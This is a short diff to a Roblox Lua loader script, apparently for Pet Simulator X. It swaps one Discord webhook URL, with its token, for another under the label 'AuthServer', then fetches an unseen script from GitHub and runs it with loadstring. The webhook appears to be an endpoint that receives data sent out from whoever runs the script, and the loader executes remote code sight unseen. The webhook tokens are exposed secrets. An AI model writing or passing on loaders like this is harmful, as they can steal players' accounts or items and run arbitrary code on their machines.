@@ -1,3 +1,3 @@
 _G.Key = "etsaPeDiruteP"
-_G.AuthServer = "https://discord.com/api/webhooks/1064100142472511508/LmiiseL0RkwKqP384IOlvAHQws1VvNjp0rKimAzUFIJDFoFfmUoUtk3aPT75acdrRZWx"
+_G.AuthServer = "https://discord.com/api/webhooks/1064100149179195442/XhwvLDfesb3fR1r59fTkSdV8OJIrTTgacDxt_r_gjzvEdqA9I9CqfAiS_j9HXy43kvOm"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
